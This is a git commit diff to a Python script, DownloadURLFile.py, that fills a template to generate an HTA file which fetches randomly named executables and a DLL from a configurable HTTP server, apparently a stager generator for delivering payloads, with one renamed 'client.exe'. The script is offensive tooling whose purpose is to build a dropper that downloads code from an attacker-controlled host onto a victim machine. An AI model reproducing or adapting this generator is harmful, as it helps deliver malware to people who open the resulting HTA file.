00271617e8af5bf9d363229a01c42b87a79e5bf8
CuiXY-prog <2412875746@qq.com>
2020-04-15 15:37:07 +0800

    Add files via upload

--- hta/DownloadURLFile.py
+++ hta/DownloadURLFile.py
@@ -3,14 +3,8 @@
 import os
 import optparse
 
-downloadfile1 = "http://192.168.1.30/QaMG6tjypFHaKYPL.exe"
-ownfile1 = "QaMG6tjypFHaKYPL.exe"
-downloadfile2 = "http://192.168.1.30/rYa5lUhEFD6llgIv.exe"
-ownfile2 = "rYa5lUhEFD6llgIv.exe"
-createfilename = "9C1KOoMovsIevYKE.hta"
-
-def main():
-	with open("DownloadURLFile.hta", "r") as readfile:
+def main(downloadfile1, downloadfile2, ownfile1, ownfile2):
+	with open("DownloadURLFile", "r") as readfile:
 		with open("Download.hta", "w") as writefile:
 			data = readfile.read()
 			offset = data.find("DOWNLOADFILE1", 0)
@@ -23,19 +17,20 @@ def main():
 			data = data[:offset] + ownfile2 + data[offset+8:]
 			offset = data.find("OWNFILE3", 0)
 			data = data[:offset] + ownfile1 + data[offset+8:]
-			offset = data.find("CREATEFILENAME1", 0)
-			data = data[:offset] + createfilename + data[offset+15:]
-			offset = data.find("CREATEFILENAME2", 0)
-			data = data[:offset] + createfilename + data[offset+15:]
 			writefile.write(data)
 
 if __name__ == '__main__':
+
+	downloadfile1 = "QaMG6tjypFHaKYPL.dll"
+	downloadfile2 = "rYa5lUhEFD6llgIv.exe"
+
+	ownfile1 = "QaMG6tjypFHaKYPL.dll"
+	ownfile2 = "client.exe"
+	URLPath = "http://192.168.0.1//"
 	parse = optparse.OptionParser()  
-	parse.add_option('-a', '--downloadfile1', dest='downloadfile1', type=str)
-	parse.add_option('-b', '--downloadfile2', dest='downloadfile2', type=str)
-	parse.add_option('-c', '--ownfile1', dest='ownfile1', type=str)
-	parse.add_option('-d', '--ownfile2', dest='ownfile2', type=str)
-	parse.add_option('-e', '--createfilename', dest='createfilename', type=str)
+	parse.add_option('-a', '--URL', dest='URLPath', type=str)
+	parse.add_option('-b', '--Downloadfile1', dest='downloadfile1', type=str)
+	parse.add_option('-c', '--Downloadfile2', dest='downloadfile2', type=str)
 	options,args=parse.parse_args()
 	if options.downloadfile1 != None:
 		downloadfile1 = options.downloadfile1
@@ -43,12 +38,9 @@ if __name__ == '__main__':
 	if options.downloadfile2 != None:
 		downloadfile2 = options.downloadfile2
 
-	if options.ownfile1 != None:
-		ownfile1 = options.ownfile1
+	if options.URLPath != None:
+		URLPath = "Http://" + options.URLPath + '//'
 
-	if options.ownfile2 != None:
-		ownfile2 = options.ownfile2
-
-	if options.createfilename != None:
-		createfilename = options.createfilename
-	main()
+	downloadfile1 = URLPath + downloadfile1
+	downloadfile2 = URLPath + downloadfile2
+	main(downloadfile1, downloadfile2, ownfile1, ownfile2)
